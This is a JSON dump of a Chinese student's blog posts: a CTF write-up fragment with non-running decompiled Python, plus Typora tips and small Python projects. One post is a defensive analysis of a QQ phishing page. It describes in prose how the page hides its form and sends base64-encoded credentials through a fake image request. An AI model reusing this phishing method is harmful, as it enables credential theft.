52, 124, 22, 137, 56, 94, 107, 59, 132, 90, 3, 51, 46, 77, 127, 35, 86, 134, 20, 73, 32, 66, 99, 7, 69, 122, 4, 142, 23, 80, 109, 60, 79, 36, 62, 5, 104, 102, 14, 58, 149, 31, 96, 68, 114, 116, 11, 95, 87, 146, 123, 15, 135, 33, 37, 110, 19, 106, 30, 130, 101, 97, 98, 141, 2, 47, 6, 24, 131, 16, 111, 150, 55, 1, 76, 12, 138, 64, 120, 118, 29, 145, 147, 9, 113, 103, 40, 92, 71, 72, 129, 139, 100, 63, 133, 42, 125, 74, 88, 143, 144, 38, 140, 67, 119, 136, 115, 54, 21, 50, 108, 128, 57, 112, 43, 84, 70, 78, 28, 41, 93, 44, 13, 18, 10, 48, 27, 83, 65, 17, 75, 126, 39, 49, 91, 34, 82, 45, 148, 105, 89, 117] key = (lambda .0: continue[ i for i in .0 ])(filter(check_prime, test)) return key if __name__ == '__main__': key = generate_key() msg = [ 22, 21, 167, 66, 9, 27, 3, 119, 42, 99, 68, 86, 13, 166, 3, 120, 22, 59, 9, 77, 40, 3, 233, 41, 67, 108, 80, 179, 86, 36, 31, 107, 77, 4, 75] print('encryt message is {}'.format(msg)) lambda .0: continue[ i for i in .0 ] 这个.0执行不了啊emmm 我换成x也报错唉！ middle_pwn 小结 第一次打CTF呢，虽然只拿了个第六，还拿了个娃娃233 除了石榴园的真的没多少打这个比赛的呀。 我好菜啊，这次一题pwn都没写出来，好难过嘤嘤嘤 现场查BurpSuite怎么用也是绝了（那节培训我没去emmm 总之CTF还是挺好玩的哈哈哈哈，有空还是要好好学一波呢！ 等我有空再折腾一下，搭个博客吧 咕咕咕 20191128 更新：我来折腾了，嘻嘻嘻！","path":"2019/11/28/CTF_2019Asuri_Recruitment/"},{"title":"test","text":"测试一下再来一下哈~ 喵~~嘿嘿嘿","path":"2019/11/28/test/"},{"title":"typora_tips 一些关于typora的快捷键","text":"[TOC] ​ 随便练练typora，参考了一些网上的资料，顺便记录一下，方便后面查阅哈~ 标题ctrl + 数字键 最多支持到六级标题 一级标题 二级标题 三级标题 四级标题 五级标题 六级标题 取消标题​ ctrl + 数字0 标题取消标题 加粗ctrl + B 这是加粗 倾斜ctrl + I 这是倾斜 下划线ctrl + U 这是下划线 删除线alt + shift + 5 这是删除线 无序列表 - + space + enter miao miaomiao! 嵌套 再来嵌套 上一个层次 喵！ 有序列表数字键. + space + enter 第一个 第二个 嵌套一下 再来一下 再嵌套一个 继续 继续来 就这样吧 任务列表- [] TODO - [x]已完成 这是待完成的 这个已完成了 引用&gt; + space + enter 或者 ctrl + shift + Q 这就是引用 这也是 ​ 还可以嵌套引用 ​ 再来一个 这也行 一样的 插入图片ctrl + shift + I 网上说用MPic做图床挺不错的。（还没试过 直接拖进来也行 插入链接ctrl + K 这是链接，跳转到我的博客哈 插入表格ctrl + T mm text 测试 再测试 123 456 插入代码单行代码（文中的代码）ctrl + shift + ` `输入代码` 多行代码（代码块）ctrl + shift + K ``` 输入代码 ``` print(\"Hello world!\\n\") # Python printf(\"Hello, this is C.\") // C disp(\"Hello, this is MATLAB.\") % MATLAB print(\"Hello, this is lua.\") -- lua 插入表情:名称: (英文状态下) :cat: :dog: PS：微软输入法可以用ctrl + shift + B弹出表情窗口。 😀👌 插入分割线--- 下面是分割线 插入高亮显示==中间写文字== ==这是高亮== 插入脚注文字[^脚注] 示例^1 插入公式ctrl + shift + M 或者 行内公式（内联公式）： $公式$ 行间公式： $$ 公式 $$ $$\\lim_{x\\to +\\infty} \\frac{1}{x}=0$$加个框试试（\\boxed{}）：$$\\boxed{ \\overrightarrow{AB}}$$ 这是行内公式 $ \\sqrt[3]{test} $ ，妙啊~ 具体的还得慢慢看呢。 顺便学一波LaTex也挺不错的~ 插入目录[toc] + ENTER 就是最上面那个啦~ 新建文件ctrl + N 选中中文/英文ctrl + D miao miao~ ctrl + Shift + 左/右 快速选中整个词语/单词。 选中整行ctrl + L 查找ctrl + F 替换ctrl + H 跳转到开头/结尾ctrl + HOME 跳转至文章开头 ctrl + END 跳转至文章末尾 打开文件（笔记）ctrl + P 全屏显示F11 侧边栏ctrl + shift + L 清除格式ctrl + \\ 切换到代码模式ctrl + / ==etc.== 还有挺多还要慢慢去发掘呢~ 顺便说一下 Snipaste 这个截图工具挺强大的 官网 https://zh.snipaste.com/ 本文搬运自我的csdn博客啦~","path":"2019/08/29/typora_tips/"},{"title":"小想法 | 开源一个自己的Python小项目「Park at ease」停车场管理系统","text":"Park at ease停车场管理系统基于Python实现 Park Management SystemBased on Python… print('Hello, this is Park_at_ease!') 一些说明这个项目本来是给部门里小干事布置的《2019寒假进阶指南》里 Section2 的课设任务（题目基本上是根据自己的想法出的），当时自己正好在学Python，就想拿这个项目练练手，于是就有了这个基于Python面向对象实现的停车场管理系统。 原来这个项目都是自己弄着玩的，这几天整理文件发现几个月前还写了这玩意儿，还挺有意思的。这个项目其实还有很多可以开发的空间的，于是就想着把它开源了吧，希望大家可以一起来完善呢！ PS:原则上不提供技术支持哈。 项目网站（基于Github Pages搭建）：来点我哈 或 https://miaotony.github.io/Park_at_ease/ GitHub项目网址：来点我鸭 或 https://github.com/miaotony/Park_at_ease 欢迎大家在此基础上继续完善鸭~欢迎Star、Fork、提PR &amp; issue！ 使用及转载时请注明出处，保留作者信息，严禁商用，严禁用于完成课设任务，谢谢！ Overview 这是编者参考了一小部分网络上相关的题目，结合实际生活，融合了自己一些想到的，给小干事们出的题目。这里直接就截屏放出来吧，PDF还有别的内容懒得改了。如果有什么建议欢迎在GitHub上提issue或者在这里评论哈~！ TODO 管理员界面 Administrator Interface 文件操作 FileIO 登录界面 Login 登录加密 Login Encryption 图形界面 GUI 多线程或多进程 Multithreading or Multiprocessing 邮件推送 Email Push 微信推送 WeChat Push TCP 嵌入式开发 Embedded Development etc. 具体请移步到GitHub鸭！ 项目网站（基于Github Pages搭建）：来点我哈 或 https://miaotony.github.io/Park_at_ease/ GitHub项目网址：来点我鸭 或 https://github.com/miaotony/Park_at_ease 溜了溜了下次再见啦~ 搬运自我的csdn博客啦~","path":"2019/08/18/Park_at_ease/"},{"title":"小想法 | 基于模拟点击实现数据自动测量","text":"搬运一篇之前写的小想法啦~ 起因人工智能——先人工后智能哪里有现成数据给你还不是人工手动去测…… 大创要测数据emmm，简单来说就是点点按钮，等它数据测量完成，然后按照命名规范保存。就是这个也太枯燥了8，效率还低。不如py一下写个自动执行的！说写就写呗（斜眼笑.gif) 初代版本发现Python有个现成的第三方库叫PyAutoGui库，它给的函数还是挺方便的。按照测数据操作的流程用代码还原一遍，测试发现速度太快了电脑吃不消，于是乎到处加延时233。 总之还是挺不错的吧输入角度、次数、开始index（程序崩的时候备用），然后就可以自动开始测量，新建文件夹，按顺序命名保存。 理论一天可测的数据量从270组提高到435组，效率提升了61%吧！ 还要感谢潇潇弟弟陪我debug 嘻嘻嘻~ 升级版 Update on 20190725. 之前写的自动测数据的程序还有点小问题，今天又更新了两个版本。。 由于测量软件的问题，每组都会漏一些数据，所以还要手动补测。 于是乎今天加了个文件是否存在的判断，确定保存成功之后才继续下一组测量，这样就不用补测了！ 另外还加入了log，记录日志文件方便检查错误。 嘿嘿嘿~","path":"2019/07/10/Idea_AutoMeasure/"},{"title":"第一篇 随便写写","text":"搬运自我的CSDN博客 这篇可以算是第一次公开发出来的吧（其实严格来说也不算啦，只是之前发的年份过久估计都404或者找不到了233 print(\"Hello, everyone!\") Why? 上了大学之后，做大作业、写论文、写报告、做项目、参加各种比赛，经常需要各种找资料，大多是EE和CS方向的。 这时候经常就逛到CSDN、博客园、简书、逼乎之类的这些，或者大佬们自己搭建的博客，当然还有B站这样有着各种学习视频的好地方。 大家都乐于把自己的体会和经验分享出来，对于我这样的菜鸡来说帮助很大鸭。比如说码着码着代码遇到啥bug了，然后上来一查，很多时候别人也遇到过，于是乎什么情况下遇到的、如何解决的大都有了，很方便就能解决问题呢。 其实本来就觉得写点东西挺有意思的，特别是看到身边的小伙伴在CSDN上也开了自己的账号，开始分享自己的一些 debug 经历以及生活常事，越发觉得挺有意思的也挺有意义的。于是我也来写一写呗。 登录的时候突然才发现，CSDN上我的账号原来7年前就注册了，估计之前还只是随便逛逛以及下载些资料，都没有在这儿写过啥东西233。没事问题不大哈哈哈。 When?其实之前有啥小想法或者小制作，都是随便写两句话讲讲到空间……当然，有想法 &amp;&amp; 有空 的时候，就来这儿写点东西吧！ What?其实我感兴趣的东西挺多的 emmm比如说大体说一说嘛： 嵌入式相关 MCU单片机 FPGA 物联网 IoT ESP8266（准备好好研究一波，可以单独列一列） 编程 Python 以及各种库 MATLAB 人工智能 AI 机器学习 Machine Learning，ML 计算机视觉 Computer Vision，CV 数据分析与挖掘 数据获取（如爬虫虫） 数据可视化 数据挖掘 微信小程序开发 前端尝个鲜 视频制作 etc. 其实就是啥都想玩一玩，感觉能做的就去尝试尝试，特别是那种接近实际的。于是乎就想写啥就写啥呗。不过基本上以小想法为主，就是随便记录一下这样吧。 好啦第一篇就这样随便写写了。溜啦溜啦~","path":"2019/07/09/FirstBlog/"},{"title":"小想法 | 某QQ空间盗号页面分析","text":"搬运自之前的小脑洞小想法啦 起因昨晚有个小伙伴空间里把列表都at了（后来知道的），附带P1这张图。 然后感觉不对劲，肯定是被盗号了。 然后突然有个脑洞，去看看这里面有啥吧 折腾记录用扫码工具（千万别拿QQ来扫，虽然这次的链接没啥大影响）得到二维码文字内容，发现是类似url.cn/...的短链接。 用电脑浏览器打开，同时打开调试窗口，发现短链接跳转到一个Github.io的页面（P3），很明显是GitHub Pages。 于是去GitHub上查找该用户，发现只有个项目，里面就只有一个index.html文件，对应着P2页面，最新版本还是昨天提交的（P4）。 感觉不对，于是改变 User Agent 为手机，重新访问短链接，跳转P5页面，是个伪QQ空间登录界面，果然是个钓鱼页面233。 点击一键登录，延时一会儿会提示 请安装最新版本QQ 。【忘了密码】及【注册新账号】都是跳转到QQ官方的页面。然后输个123456789啥的测试一下，还会提示 请输入正确账号或者密码 啥的（P6）。 乱输一个987321654，噫进去了，跳转到了真的QQ空间，虽然并没有真的登录（P7）。 而后在调试窗口network下找了半天，都没发现我提交的账号密码。（P8-9） 顺着remote address查，发现唯一有可能的就是那个user.jpg，还带token参数，隐藏得有点意思，虽然不知道为啥404了。 jio得还没完，这token咋来的，提交的账号密码去哪了emmm，缺点啥。然后查看网页元素，找到了对应的JavaScript代码（P10-11）。 哈哈哈哈哈这个逻辑判断写的还是有点意思的，还把一堆常用简单数字给处理了，难怪前面输123456789玩不来。这个一键登录就是个假的（万一真的估计就得不到账号密码了吧）。点击登录的时候，将用户名密码拼接成json字符串，然后将字符串转换成base64加密传输，而后跳转到官方QQ空间界面。将P9的token用base64解密，果然得到了账号密码（P12）。 // 他没调用官方登录接口，没有真的登录到QQ空间已经很友好了，不然更难发现呢 到这差不多了，但感觉还没完，我们再来查查这个域名吧。 P13-15注册者信息，这人注册的域名真多。 用邮箱查询，而后随便访问几个，P16发现都重定向到了一个相似页面，原来那是西部数码上的一个域名经销商。这么说那个人也只是从经销商那里买了个域名而已。 总结这是个做得有点水平的钓鱼网站。 碰到类似的二维码别乱扫，扫了也别登录！ 至于获取账号密码之后把全列表都at，估计还写了别的脚本或者调用了啥接口，这个我还不清楚emmm 以上内容均基于公开资料，仅供学习研究使用，请勿用于非法用途。","path":"2019/03/30/Idea_AnalysisOfHackingPage/"},{"title":"小想法 | 利用python-docx批量提取Word中的信息进而导入Excel","text":"搬运自之前的小脑洞小想法啦 又是个小脑洞最近有个比赛要统计一下各组信息，信息来自Word版的申请表。 考虑到Word要一个一个打开，再复制粘贴。 简单重复，太难受了8，不如干脆py一下，写个小程序来弄吧。 大致思路一查发现.docx是以类似xml格式来存放信息的，刚开始思路就想直接解压.docx，从中解析文件然后暴力匹配。。 而后发现有个第三方库python-docx，于是乎不想造轮子了，直接拿来用吧。 然而并没有那么简单，合并的单元格变成独立重复的内容，加个去重吧。 提取信息文字都解析出来了，接下来，来点简单的正则匹配，单独拿个文件来试试，没毛病，挺好的。 批量读取遍历文件夹下所有文件，筛选.docx且排除临时文件，噫少了俩。 原来还有.doc格式的，另存为.docx (docx库只支持.docx)。 依次读取每个文件，拼接string列表，得到所需信息。 写入文件将infolist按照.csv的格式写入文件。 其实可以调用第三方库来实现的。 debug实际情况还是挺复杂的，比如表格哪里没填空缺了，或者哪个里面多加几个分隔符什么的，还是出了不少bug，于是继续完善程序，加入相应的处理呗！ 生产环境真复杂 如果用Excel打开.csv，发现学号前的0自动丢失，还是觉得不爽emmm （程序猿的自我修养 又查了查资料，新建.xlsx，从文本导入到Excel，设置好属性。 几好，完事！ 于是乎边查资料边debug边改代码 花了一个多两个小时估计几个人同时手动做早都做完了 （其实早就想过用py读取Excel了，但是一直还没试过，这次就先拿py读取Word试试水吧","path":"2019/03/21/Idea_python-docx/"},{"title":"小想法 | 基于PushBear API实现微信消息推送","text":"搬运自之前的小想法啦~ 调用API基于PushBear API实现微信消息提醒 PushBear API 用requests里现成的方法就完事了。 tkinter GUI就是直接写代码感觉有点不友好 于是想做个图形界面 基于Python GUI库tkinter简单做了一下 （代码手动写布局太难受了（还是直接用代码POST/GET方便emmm（突然jio得LabVIEW做图形界面真方便 微信推送效果 打开后是Markdown渲染的效果呢！ （完） 20191221 Update： 好久没用了不知道现在还能不能用了233","path":"2019/03/07/Idea_PushBearAPI_WeChatPush/"}]}